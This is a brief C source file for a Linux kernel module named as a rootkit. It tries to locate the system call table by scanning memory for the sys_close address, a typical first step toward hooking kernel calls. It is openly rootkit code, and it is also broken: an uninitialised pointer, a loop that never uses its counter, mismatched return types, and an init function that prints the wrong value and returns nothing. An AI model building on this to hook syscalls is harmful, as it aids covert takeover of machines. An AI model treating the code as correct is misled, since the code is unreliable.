#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/init.h>

static unsigned long int get_syscall_table(void)
{
    unsigned long *sys_call_table;
    unsigned long int i;

    for (i = sys_close; i < ULONG_MAX; i += sizeof(void *))
        if (sys_call_table[__NR_close] == (unsigned long)sys_close)
            return sys_call_table;
    return NULL;
}

static int __init init_rootkit(void)
{
    printk(KERN_INFO "%p\n", get_syscall_table);
}

static void __exit cleanup_rootkit(void)
{
    
}  

module_init(init_rootkit);
module_exit(cleanup_rootkit);
